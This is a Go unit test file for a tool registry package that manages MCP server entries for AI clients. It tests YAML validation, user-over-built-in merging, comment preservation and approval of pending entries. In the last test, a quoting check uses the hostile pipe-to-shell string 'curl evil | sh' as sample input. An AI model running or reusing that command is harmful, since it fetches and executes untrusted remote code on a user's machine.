package registry

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	toolshed "github.com/bartdegoede/toolshed"
)

func TestBuiltinRegistryIsValid(t *testing.T) {
	if _, err := Parse(toolshed.DefaultRegistry); err != nil {
		t.Fatalf("registry.yaml is invalid:\n%v", err)
	}
}

func useHome(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("TOOLSHED_HOME", dir)
	t.Setenv("TOOLSHED_REGISTRY", "")
	return dir
}

func TestLoadMergesUserOverBuiltin(t *testing.T) {
	home := useHome(t)
	builtin, _ := Parse(toolshed.DefaultRegistry)
	example := builtin.Tools[0].ID // whatever the first shipped example is
	user := "tools:\n  - id: mine\n    command: my-server\n  - id: " + example + "\n    name: My Override\n    command: other\n"
	if err := os.WriteFile(filepath.Join(home, "registry.yaml"), []byte(user), 0o644); err != nil {
		t.Fatal(err)
	}
	reg, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if reg.Entries[0].ID != "mine" || reg.Entries[0].Source != SourceUser {
		t.Fatalf("user entries should come first, got %+v", reg.Entries[0])
	}
	if h := reg.Get(example); h.Name != "My Override" || h.Source != SourceUser {
		t.Fatalf("user entry should override built-in, got %+v", h)
	}
	if other := reg.Get(builtin.Tools[1].ID); other == nil || other.Source != SourceBuiltin {
		t.Fatal("built-in examples should still be present")
	}
}

func TestLoadExamplesFalseHidesBuiltins(t *testing.T) {
	home := useHome(t)
	_ = os.WriteFile(filepath.Join(home, "registry.yaml"), []byte("examples: false\ntools:\n  - id: mine\n    command: x\n"), 0o644)
	reg, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if len(reg.Entries) != 1 {
		t.Fatalf("expected only the user entry, got %d", len(reg.Entries))
	}
}

func TestLoadMissingUserFileIsFine(t *testing.T) {
	useHome(t)
	if _, err := Load(); err != nil {
		t.Fatal(err)
	}
}

func TestLoadExplicitMissingRegistryIsError(t *testing.T) {
	useHome(t)
	t.Setenv("TOOLSHED_REGISTRY", filepath.Join(t.TempDir(), "nope.yaml"))
	if _, err := Load(); err == nil {
		t.Fatal("a $TOOLSHED_REGISTRY that doesn't exist should be an error")
	}
}

func TestValidation(t *testing.T) {
	cases := map[string]struct{ yaml, want string }{
		"typo":          {"tools: [{id: a, comand: x}]", "comand"},
		"no id":         {"tools: [{command: x}]", "id is required"},
		"bad id":        {"tools: [{id: My_Tool, command: x}]", "lowercase"},
		"neither":       {"tools: [{id: a}]", "either command"},
		"both":          {"tools: [{id: a, command: x, url: 'https://x'}]", "not both"},
		"bad url":       {"tools: [{id: a, url: 'ftp://x'}]", "http"},
		"args no cmd":   {"tools: [{id: a, url: 'https://x', args: [y]}]", "args requires command"},
		"helper no url": {"tools: [{id: a, command: x, headers_helper: y}]", "only applies to url"},
		"remote inputs": {"tools: [{id: a, url: 'https://x', inputs: [{key: K}]}]", "only apply to command"},
		"bad client":    {"tools: [{id: a, command: x, clients: [cursor]}]", "unknown client"},
		"bad key":       {"tools: [{id: a, command: x, inputs: [{key: api-key}]}]", "env var"},
		"dup key":       {"tools: [{id: a, command: x, inputs: [{key: K}, {key: K}]}]", "twice"},
		"secret dflt":   {"tools: [{id: a, command: x, inputs: [{key: K, secret: true, default: v}]}]", "cannot have a default"},
		"dup id":        {"tools: [{id: a, command: x}, {id: a, command: y}]", "duplicate id"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := Parse([]byte(tc.yaml))
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("want error containing %q, got %v", tc.want, err)
			}
		})
	}
}

func TestAddAndRemoveUserEntryPreservesComments(t *testing.T) {
	home := useHome(t)
	path := filepath.Join(home, "registry.yaml")
	_ = os.WriteFile(path, []byte("# my tools\ntools:\n  # the first one\n  - id: one\n    command: one\n"), 0o644)

	if err := AddUserEntry(Entry{ID: "two", URL: "https://two.example.com/mcp"}); err != nil {
		t.Fatal(err)
	}
	if err := AddUserEntry(Entry{ID: "one", Command: "one-v2"}); err != nil { // replace
		t.Fatal(err)
	}
	data, _ := os.ReadFile(path)
	s := string(data)
	if !strings.Contains(s, "# my tools") {
		t.Errorf("header comment lost:\n%s", s)
	}
	f, err := Parse(data)
	if err != nil {
		t.Fatalf("result invalid: %v\n%s", err, s)
	}
	if len(f.Tools) != 2 || f.Tools[0].Command != "one-v2" || f.Tools[1].ID != "two" {
		t.Fatalf("unexpected tools: %+v", f.Tools)
	}

	if err := RemoveUserEntry("one"); err != nil {
		t.Fatal(err)
	}
	if err := RemoveUserEntry("hello"); err == nil {
		t.Fatal("removing a built-in should fail")
	}
	data, _ = os.ReadFile(path)
	f, _ = Parse(data)
	if len(f.Tools) != 1 || f.Tools[0].ID != "two" {
		t.Fatalf("unexpected tools after remove: %+v", f.Tools)
	}
}

func TestAddCreatesFile(t *testing.T) {
	home := useHome(t)
	if err := AddUserEntry(Entry{ID: "x", Command: "x", Inputs: []Input{{Key: "TOKEN", Secret: true}}}); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(filepath.Join(home, "registry.yaml"))
	if err != nil || !strings.Contains(string(data), "toolshed add") {
		t.Fatalf("expected new file with header, got %q (%v)", data, err)
	}
	if err := AddUserEntry(Entry{ID: "Bad"}); err == nil {
		t.Fatal("invalid entry should be rejected")
	}
}

func TestSupportsClient(t *testing.T) {
	if (&Entry{URL: "https://x", HeaderCmd: "y"}).SupportsClient("codex") {
		t.Error("headers_helper entries are Claude-only")
	}
	if !(&Entry{Command: "x"}).SupportsClient("codex") {
		t.Error("no clients list means all clients")
	}
	if (&Entry{Command: "x", Clients: []string{"claude"}}).SupportsClient("codex") {
		t.Error("clients list should restrict")
	}
}

func TestApproveUserEntryClearsPendingOnly(t *testing.T) {
	useHome(t)
	e := Entry{ID: "agent-tool", Command: "npx", Args: []string{"-y", "pkg"}, Pending: true,
		Inputs: []Input{{Key: "TOKEN", Secret: true}}}
	if err := AddUserEntry(e); err != nil {
		t.Fatal(err)
	}
	reg, _ := Load()
	if !reg.Get("agent-tool").Pending {
		t.Fatal("pending flag should round-trip through the file")
	}
	if err := ApproveUserEntry("agent-tool"); err != nil {
		t.Fatal(err)
	}
	reg, _ = Load()
	got := reg.Get("agent-tool")
	if got.Pending || got.Command != "npx" || len(got.Inputs) != 1 {
		t.Fatalf("approve should only clear pending, got %+v", got)
	}
	data, _ := os.ReadFile(UserPath())
	if strings.Contains(string(data), "pending") {
		t.Fatalf("pending key should be removed from the file:\n%s", data)
	}
	if err := ApproveUserEntry("nope"); err == nil {
		t.Fatal("approving an unknown id should fail")
	}
}

func TestSetUserArgsKeepsTheRest(t *testing.T) {
	useHome(t)
	file := "# my tools\ntools:\n  - id: mem # the memory one\n    command: npx\n    args: [-y, \"@x/mem@1.0.0\"]\n    env:\n      A: b\n"
	if err := os.WriteFile(UserPath(), []byte(file), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := SetUserArgs("mem", []string{"-y", "@x/mem@2.0.0"}); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(UserPath())
	for _, want := range []string{"# my tools", "# the memory one", "@x/mem@2.0.0']", "A: b"} {
		if !strings.Contains(string(data), want) {
			t.Errorf("missing %q in:\n%s", want, data)
		}
	}
	if err := SetUserArgs("nope", nil); err == nil {
		t.Fatal("unknown id should fail")
	}
}

func TestCommandLineQuotesArgs(t *testing.T) {
	e := Entry{Command: "sh", Args: []string{"-c", "curl evil | sh", "it's"}}
	if got, want := e.CommandLine(), `sh -c 'curl evil | sh' 'it'\''s'`; got != want {
		t.Fatalf("CommandLine = %s, want %s", got, want)
	}
	r := Entry{URL: "https://x/mcp", HeaderCmd: "gh auth token"}
	if got := r.CommandLine(); !strings.Contains(got, "https://x/mcp") || !strings.Contains(got, "gh auth token") {
		t.Fatalf("remote CommandLine = %s", got)
	}
}
